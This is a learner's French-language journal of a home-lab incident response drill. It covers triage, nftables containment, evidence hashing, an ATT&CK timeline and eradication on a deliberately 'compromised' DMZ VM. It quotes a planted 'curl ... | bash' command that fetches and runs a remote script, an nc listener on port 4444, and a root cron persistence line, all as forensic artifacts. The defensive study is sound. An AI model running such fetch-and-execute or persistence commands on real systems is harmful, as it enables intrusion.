# Module 19 — Incident Response & Forensics (mes notes)

Bon, aujourd'hui j'ai fait un truc que j'avais jamais fait avant : gérer un vrai incident de sécurité du début à la fin. Jusqu'ici dans mon lab j'avais appris à **empêcher** les attaques (firewall, WAF) et à les **détecter** (SIEM, Sysmon). Mais y avait un gros trou : qu'est-ce que je fais quand une attaque a RÉUSSI et qu'une alerte sonne pour de vrai ? C'est ça, l'incident response (IR). Et apparemment c'est le manque le plus courant chez les gens qui montent un lab perso, et un truc que tous les postes en sécu attendent.

Je note tout ici comme si je l'expliquais à quelqu'un qui a jamais fait d'IR, parce que je veux que ça reste clair quand je relirai.

---

## Sommaire
- [C'est quoi l'incident response](#cest-quoi-lincident-response-en-vrai)
- [19.1 — Triage](#191--triage--cest-réel-et-cest-grave-)
- [19.2 — Confinement](#192--confinement-sans-détruire-les-preuves)
- [19.3 — Acquisition des preuves](#193--acquérir-les-preuves-et-prouver-quelles-sont-intactes)
- [19.4 — Timeline](#194--construire-la-timeline)
- [19.5 — Éradication & récupération](#195--éradiquer-récupérer-et-faire-la-revue)

---

## C'est quoi l'incident response, en vrai

En gros : une machine s'est fait pirater. Mon boulot c'est de réagir **sans empirer les choses**. Et le piège numéro 1, celui que tout débutant fait, c'est de paniquer et de faire le pire geste possible : **redémarrer ou réinstaller la machine tout de suite**.

Pourquoi c'est le pire geste ? Parce que c'est comme nettoyer une scène de crime à la javel avant que la police arrive. Tu détruis les preuves, tu comprends jamais COMMENT le mec est entré, et du coup il revient le lendemain par la même porte.

Un pro fait l'inverse : il **contient, préserve les preuves, comprend comment c'est arrivé, PUIS répare**.

### Le cadre qu'on suit : PICERL

C'est une méthode en 6 étapes, dans l'ordre. L'acronyme c'est PICERL :

- **P**réparation : avoir mes outils et mes procédures prêts AVANT l'incident
- **I**dentification : c'est réel ou un faux positif ? Et si c'est réel, c'est grave à quel point ? (= le triage)
- **C**onfinement : arrêter la propagation, isoler la machine, mais SANS détruire les preuves
- **É**radication : virer l'attaquant pour de bon, en s'attaquant à la CAUSE RACINE pas juste au symptôme
- **R**écupération : remettre la machine en service, propre et vérifiée
- **L**essons learned : la revue post-incident, sans chercher de coupable, pour que ça recommence pas

Le truc que je retiens : **un bon process IR est indépendant de la techno**. Que ce soit une VM Linux, un conteneur ou du cloud, le cycle PICERL reste le même, seuls les outils changent. Si mon process change quand la plateforme change, c'est que c'était pas un process, juste une liste de commandes.

### Le concept LE PLUS important : l'ordre de volatilité

Faut vraiment que je grave ça. Quand une machine est piratée, les preuves les plus précieuses sont aussi les plus **fragiles** :

- La **RAM (mémoire vive)** contient le malware en train de tourner, les mots de passe déchiffrés, les clés → **ça disparaît instantanément si j'éteins la machine**
- Les **connexions réseau actives** montrent avec qui l'attaquant parle (son serveur de contrôle) → **ça disparaît au reboot**
- Le **disque** lui, il persiste → je peux le lire plus tard

Donc la règle d'or : **je capture d'abord ce qui s'évapore le plus vite** (RAM, connexions), ensuite ce qui reste (disque). Et SURTOUT : **j'isole la machine du réseau, je ne l'ÉTEINS PAS.** Éteindre = tuer les preuves.

---

## Mon drill : j'ai simulé un incident de A à Z

Pour apprendre, on a monté un vrai exercice ("IR drill"). J'ai pris ma VM **web-dmz** (mon serveur web exposé en DMZ) comme victime, j'y ai planté une fausse compromission (inoffensive mais réaliste), et j'ai déroulé tout le cycle PICERL en jouant le responder.

Ce que la "compromission" a installé (des leurres, mais qui ressemblent à une vraie attaque) :
- un faux malware qui tourne (`/tmp/.systemd-private`) — nommé exprès pour ressembler à un truc système légitime, pour se cacher
- un beacon C2 (un `nc` qui écoute sur le port 4444)
- un dropper (`/tmp/.x11-unix-cache`)
- une persistence via cron (le malware se relance tout seul toutes les 5 min)
- une trace dans l'historique : `curl http://203.0.113.66/x.sh | bash`

### Le lab avant le drill

![VirtualBox VMs — lab complet](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2020-24-58.png)

### Mise en place de la scène de crime

J'ai planté les leurres sur web-dmz depuis mgmt-ansible (en SSH) : le faux implant, le nc sur 4444, le dropper, le cron, et la trace dans bash_history.

![Planter le malware + nc + dropper](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2020-46-08.png)
![Suite — cron + bash_history + scène prête](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2020-51-01.png)
![Scène prête — vue complète](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2020-51-19.png)

---

## 19.1 — Triage : c'est réel, et c'est grave ?

Le scénario : une alerte sonne, activité suspecte sur web-dmz. Je sais pas encore si c'est réel. Mon but : le découvrir SANS rien casser.

Je me connecte en SSH depuis mon poste (mgmt-ansible) et j'inspecte, **dans l'ordre de volatilité** (le plus fragile d'abord). Et je touche à RIEN — j'observe et je note.

Les commandes de triage :

```bash
who; last -20              # qui est/était connecté
ps auxf                    # l'arbre des process (le f montre parent -> enfant)
sudo ss -tunap             # les connexions réseau actives (pour trouver le C2)
ls -alt /tmp /dev/shm /var/tmp   # les endroits classiques où on dépose un malware
sudo crontab -l; ls -la /etc/cron.*   # la persistence
```

### Ce que j'ai trouvé (et comment je l'ai lu)

**Dans `ps auxf`** — l'arbre de process m'a montré :
```
root  /bin/bash /tmp/.systemd-private     ← le malware qui tourne
root  /usr/sbin/CRON -f -P                ← et cron qui le relance = persistence
```
Un process qui tourne depuis `/tmp`, c'est déjà louche (un serveur lance jamais un vrai programme depuis /tmp). Et le `.` devant le nom = fichier caché = drapeau rouge.

![ps auxf — malware + cron visible dans l'arbre](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2020-57-51.png)

**Dans `ss -tunap`** :
```
tcp LISTEN 0.0.0.0:4444  users:(("nc",pid=...))
```
Un `nc` qui écoute sur le port 4444. Un serveur web écoute sur 80/443, pas sur 4444. Le 4444 c'est LE port classique des reverse shells. Drapeau rouge.

![ss -tunap — nc sur 4444 visible + ps auxf complet](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2020-58-27.png)

**Dans `/tmp` et les drop zones** :

![ls -alt /tmp /dev/shm /var/tmp — malware visible](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2020-59-47.png)

Le piège d'analyste : dans `/tmp` y avait aussi des vrais dossiers `systemd-private-fad13...` qui sont LÉGITIMES (systemd les crée pour isoler ses services). L'attaquant a nommé son malware `.systemd-private` EXPRÈS pour se fondre dedans. Faut savoir distinguer le légitime (dossier, nom long avec hash) du malveillant (fichier caché, nom court, exécutable dans /tmp). Le camouflage c'est une technique d'évasion classique.

**Dans les crontabs** :

```
*/5 * * * * root /tmp/.systemd-private
```
Une tâche cron qui relance le malware toutes les 5 min en root.

![crontab -l + ls -la /etc/cron.*](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2021-00-15.png)
![cat /etc/cron.d/* — persistence + ls -alt /tmp](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2021-00-51.png)

**Dans l'historique et les timestamps** :

![tail bash_history — curl attaquant visible](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2021-03-09.png)

```
curl http://203.0.113.66/x.sh | bash
```
Voilà COMMENT il est entré : il a téléchargé un script depuis son serveur et l'a exécuté direct. Ça me donne l'IP de l'attaquant.

### Mon verdict de triage

C'est RÉEL, gravité ÉLEVÉE (exécution root + persistence + C2 actif), 1 machine touchée confirmée. J'escalade. Et j'ai fait tout ça **sans rien casser** — le malware tourne encore, prêt à être analysé.

---

## 19.2 — Confinement sans détruire les preuves

Là le réflexe amateur ce serait "je tue le process et je supprime tout !". NON. Si je fais ça, je détruis les preuves. Le bon geste : **ISOLER, pas détruire**. Je coupe l'attaquant du réseau (il peut plus parler à son C2 ni se propager) mais le malware continue de tourner, intact.

J'ai isolé avec **nftables** (le firewall du kernel Linux — nft c'est juste la télécommande, le vrai filtrage se fait dans le noyau par Netfilter). L'idée : bloquer tout le trafic sortant SAUF vers mon poste d'analyste.

### LA grosse leçon (que j'ai apprise à la dure)

Je me suis **coupé moi-même** en faisant les choses dans le mauvais ordre. J'ai activé le `policy drop` (qui bloque tout) AVANT d'avoir ajouté les exceptions (qui autorisent ma connexion SSH). Résultat : ma session SSH est morte, j'ai dû passer par la console directe de la VM pour réparer avec `sudo nft flush ruleset`.

![Le self-firewall — policy drop sans exceptions](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2021-33-09.png)

**Le bon ordre, c'est : les exceptions D'ABORD, le blocage EN DERNIER.**

```bash
# 1. créer la table + chaîne SANS le drop pour l'instant (tout passe encore)
sudo nft add table inet quarantine
sudo nft add chain inet quarantine output '{ type filter hook output priority 0; }'

# 2. les EXCEPTIONS d'abord (tant que rien est bloqué)
sudo nft add rule inet quarantine output ct state established,related accept
sudo nft add rule inet quarantine output ip daddr 10.10.99.10 accept   # mon poste

# 3. SEULEMENT MAINTENANT, activer le blocage par défaut
sudo nft chain inet quarantine output '{ policy drop; }'
```

![Confinement corrigé — exceptions + policy drop](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2021-38-30.png)

### La preuve que l'isolation marche

![nft list ruleset + ping 8.8.8.8 → 100% packet loss](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2022-20-49.png)

```
ping -c2 8.8.8.8  →  100% packet loss   (l'attaquant est coupé du monde)
```

Le malware tourne encore, le nc écoute encore, mais tout est coupé du réseau. Attaquant neutralisé, preuves intactes. C'est ça un bon confinement.

À retenir pour toujours : sur un firewall, on ouvre les sorties de secours AVANT de fermer la porte principale. Sinon on se "firewall soi-même", et sur un vrai serveur distant ça veut dire perdre l'accès et devoir envoyer quelqu'un physiquement.

---

## 19.3 — Acquérir les preuves et prouver qu'elles sont intactes

Maintenant je capture les preuves avant de nettoyer. Le principe : **une preuve est utile seulement si je peux prouver qu'elle a pas été modifiée.**

Deux concepts clés :
- **Le hash = le sceau.** Je calcule le SHA-256 d'une preuve. Plus tard, si je re-calcule et que j'obtiens le même hash, je prouve que personne l'a touchée. C'est la différence entre "je crois que l'attaquant a fait X" et "voici une preuve solide".
- **La chaîne de possession** = le registre de qui a tenu la preuve, quand, et d'où elle vient. Sans ça, même une preuve intacte est contestable.

### La leçon "Préparation" (le P de PICERL)

J'ai voulu capturer la RAM avec `avml` (l'outil du manuel) mais → `Impossible de trouver le paquet avml`. Deux raisons : web-dmz est isolé (pas d'Internet pour télécharger), et avml est pas dans les dépôts standards de toute façon.

![avml introuvable sur la machine isolée](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2022-52-09.png)

**La leçon** : mes outils forensiques doivent être prêts AVANT l'incident. Je peux pas les installer pendant, surtout sur une machine isolée. Un vrai responder a une "clé USB forensique" avec tout dessus. C'est exactement pour ça que la phase Préparation existe.

### Ce que j'ai fait à la place (avec les outils déjà présents)

J'ai capturé l'état volatile (ce qui compte vraiment) dans un fichier texte :

```bash
sudo mkdir -p /evidence && sudo chmod 700 /evidence
sudo bash -c '{
  echo "=== PROCESS ==="; ps auxf
  echo "=== CONNEXIONS ==="; ss -tunap
  echo "=== USERS ==="; who; last -20
  echo "=== PORTS ==="; ss -tlnp
  echo "=== MODULES ==="; lsmod
} > /evidence/volatile_state.txt 2>&1'
```

![Capture de l'état volatile → /evidence](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2022-56-53.png)

Puis copie des artefacts malveillants comme preuves :

```bash
sudo cp /tmp/.systemd-private /tmp/.x11-unix-cache /etc/cron.d/systemd-daily /evidence/
sudo cp /home/badr/.bash_history /evidence/bash_history_badr.txt
```

![Evidence directory — tous les artefacts copiés](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-20-44.png)

### Le geste forensique : le sceau d'intégrité

```bash
sudo sha256sum /evidence/* > /evidence/hashes.txt
sudo cat /evidence/hashes.txt
```

![SHA-256 hashes — le sceau des preuves](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-21-35.png)

Les petits galères de permissions : d'abord le `sha256sum /evidence/*` échouait sans sudo (permission denied sur le dossier 700). `sudo su` puis redirection shell — la classique.

![Résolution des permissions + hashes](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-23-03.png)

Chaque preuve a maintenant son empreinte SHA-256. Si je re-hash plus tard et que c'est pareil, je prouve que rien a bougé.

### La chaîne de possession

![SHA-256 hashes + chain of custody](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-27-42.png)
![Chain of custody complète](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-27-46.png)

Fichier `chain_of_custody.txt` : qui (badr), quand (date), d'où (web-dmz — 10.10.30.10), méthode (acquisition manuelle + hash SHA-256), liste des preuves → `voir /evidence/hashes.txt`.

---

## 19.4 — Construire la timeline

Le livrable d'une investigation c'est une **timeline** : ce qui s'est passé, dans l'ordre, avec une preuve pour chaque étape. Et chaque étape se mappe sur une technique ATT&CK (comme au module 18).

### Comment j'ai reconstitué l'ordre

J'ai regardé les dates de création des fichiers :

```bash
sudo ls -lt --time-style=full-iso /tmp/.systemd-private /tmp/.x11-unix-cache /etc/cron.d/systemd-daily
```

```
18:43:29  /tmp/.systemd-private      ← 1er : l'implant
18:47:47  /tmp/.x11-unix-cache       ← 2e : le dropper
18:49:32  /etc/cron.d/systemd-daily  ← 3e : la persistence
```

Ça donne la chronologie exacte à la seconde. L'attaquant dépose son implant, puis ses outils, puis établit sa persistence en 6 minutes. C'est ça la forensics : les timestamps racontent l'histoire.

![Timestamps des artefacts + auth.log](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-32-17.png)

### Un truc important dans les logs auth

J'ai vu deux types de lignes dans `/var/log/auth.log` :
- des `CRON session opened for root` toutes les 5 min → **c'est la persistence de l'attaquant qui s'exécute**, encore active
- des `sudo ... badr` (mkdir /evidence, apt install, etc.) → **c'est MOI en train d'enquêter**

Faut distinguer l'activité de l'attaquant de ma propre activité de réponse. C'est pour ça qu'on documente tout ce qu'on fait — pour pas confondre plus tard.

![auth.log — CRON attaquant + sudo analyste](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-30-42.png)

### La preuve d'intrusion dans bash_history

![grep "curl" bash_history — la trace de l'intrusion](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-32-53.png)

### Ma timeline finale

```
[18:43:29] EXECUTION (T1059.004) — implant /tmp/.systemd-private déposé (root)
[18:47:47] TOOLING (T1105) — dropper déposé, entrée via curl ...203.0.113.66/x.sh | bash
[18:49:32] PERSISTENCE (T1053.003 Cron) — cron relance l'implant toutes les 5 min
[--]       C2 (T1571 Non-Standard Port) — nc en écoute sur 4444
[OBJECTIF] accès root persistant sur le serveur web exposé
```

### Les IOCs (indicateurs de compromission) à diffuser

```
IP attaquant : 203.0.113.66  |  Port C2 : 4444
Fichiers : /tmp/.systemd-private, /tmp/.x11-unix-cache, /etc/cron.d/systemd-daily
Hashes : dans hashes.txt
```

Ces IOCs, je les mets dans mon SIEM/firewall pour vérifier si l'attaquant a touché d'autres machines.

---

## 19.5 — Éradiquer, récupérer, et faire la revue

### Éradication : la cause racine, pas juste le symptôme

LE piège : si je supprime le malware mais je laisse la porte d'entrée ouverte, le mec revient ce soir. Amateur = supprime le malware. Pro = ferme la porte ET supprime le malware.

L'ordre de nettoyage (maintenant que tout est capturé et scellé) :

```bash
sudo pkill -f '.systemd-private'      # tuer le malware
sudo pkill -f 'nc -lk 4444'           # tuer le C2
sudo rm -f /etc/cron.d/systemd-daily  # virer la persistence (SINON il revient au cron)
sudo rm -f /tmp/.systemd-private /tmp/.x11-unix-cache   # virer les fichiers
```

![Éradication — pkill + rm + vérification](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-34-54.png)

Puis j'ai vérifié : plus aucun process, rien sur le 4444, fichiers disparus, cron supprimé. Les vérifs retournent rien (à part mon propre grep qui se voit lui-même, le classique). Nettoyage propre.

Cause racine (pour le drill) : exécution de x.sh téléchargé depuis 203.0.113.66. Le vrai fix ce serait de patcher le service web exploité (module 7) + rotation des secrets (module 14).

### Récupération : lever la quarantaine

```bash
sudo nft flush ruleset   # enlever la règle de quarantaine
```

**Un truc qui m'a surpris** : même après le flush, `ping 8.8.8.8` passait toujours pas. J'ai flippé au début. Mais en fait c'est NORMAL : web-dmz est en DMZ, et une DMZ bien configurée est volontairement bloquée par pfSense pour sortir vers Internet (un serveur web REÇOIT des connexions, il en initie pas vers l'extérieur). Donc web-dmz pingait jamais 8.8.8.8, même avant l'incident. Le vrai test de récupération c'est la connectivité INTERNE (vers pfSense 10.10.30.1 et mon poste 10.10.99.10), pas Internet.

Leçon : faut savoir ce qui est l'état NORMAL de la machine avant de crier au bug.

![nft flush + ping 100% loss = normal pour une DMZ](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-35-40.png)
![Double check nft list + ping — quarantaine levée, DMZ ok](../screenshots/Module19-IR-Forensics/Screenshot%20from%202026-08-07%2023-37-06.png)

### La revue post-incident (la phase la plus précieuse)

C'est une revue **sans blâme** : pas "qui a merdé", mais "qu'est-ce qu'on améliore". J'ai écrit :
- ce qui s'est passé
- ce qui aurait DÛ détecter mais qui a manqué (aucune alerte sur un process lancé depuis /tmp, aucune alerte sur le port 4444, aucune alerte sur un nouveau fichier dans /etc/cron.d)
- les améliorations concrètes, et chacune boucle avec un module que j'ai déjà fait :
  1. règle Sigma : process depuis /tmp (module 8/18)
  2. règle : nouveau fichier dans /etc/cron.d
  3. réseau : alerter sur port en écoute hors 80/443/22 (module 3)
  4. IOC : bloquer 203.0.113.66 sur pfSense + chasser sur le parc
  5. patch du service web (module 7)
  6. rotation des secrets (module 14)

---

## Le truc le plus stylé : l'incident rend tout le lab plus fort

C'est ça qui m'a marqué. Chaque ligne d'améliorations boucle avec un module que j'ai déjà construit : une nouvelle détection (8/18), une règle firewall (3), un blocage d'IOC (pfSense), un patch (7), une rotation de secret (14). **L'incident nourrit tout mon environnement.** Je subis pas l'attaque, j'en ressors plus solide. C'est ça le security engineering — cette boucle de rétroaction.

---

## Ce que je retiens (les takeaways)

1. Face à une compromission : **isoler, pas éteindre/réinstaller**. Sinon je détruis les preuves qui expliquent tout.
2. **Ordre de volatilité** : capturer le plus fragile d'abord (RAM, connexions) puis le disque.
3. **Sur un firewall : exceptions d'abord, drop en dernier** (je me suis coupé moi-même, plus jamais).
4. **Le hash = la preuve défendable** : re-hasher plus tard doit donner le même SHA-256.
5. **Outils forensiques = prêts AVANT l'incident** (avml pas dispo sur host isolé = trop tard).
6. **Cause racine, pas symptôme** : sinon l'attaquant revient par la même porte.
7. **Revue sans blâme** : chaque incident = des améliorations qui renforcent le lab.
8. Un bon process IR est **indépendant de la techno** — PICERL marche sur VM, conteneur, cloud. Seuls les outils changent.

## Les pièges que je veux plus refaire

- Se firewaller soi-même avec un policy drop sans exceptions préalables (LE piège vécu).
- Essayer d'installer un outil forensique sur une machine déjà isolée (trop tard).
- Confondre un artefact légitime (`systemd-private-<hash>` dossier) avec le malware (`.systemd-private` fichier caché) — le camouflage est une technique d'évasion.
- Paniquer parce que `ping 8.8.8.8` passe pas, alors que c'est l'état normal d'une DMZ.

---

## Où j'en suis

- [x] 19.1 Triage (dans l'ordre de volatilité, sans rien casser) — fait
- [x] 19.2 Confinement (isoler sans détruire, la leçon du self-firewall) — fait
- [x] 19.3 Acquisition + hash + chaîne de possession — fait
- [x] 19.4 Timeline mappée ATT&CK + IOCs — fait
- [x] 19.5 Éradication (cause racine) + récupération + revue blameless — fait

Mon dossier `/evidence` complet (état volatile, artefacts, hashes, chaîne de possession, timeline, revue post-incident) = mon artefact de portfolio. Le manuel dit que ce drill documenté est une des plus fortes pièces qu'un candidat junior peut montrer, parce que ça prouve que je sais gérer un vrai incident, pas juste configurer des outils.

Module 19 fini. Prochain et dernier : **Module 20 — Capstone Purple Team** (attaquer tout le lab de bout en bout et vérifier que chaque étape est bloquée ou détectée).
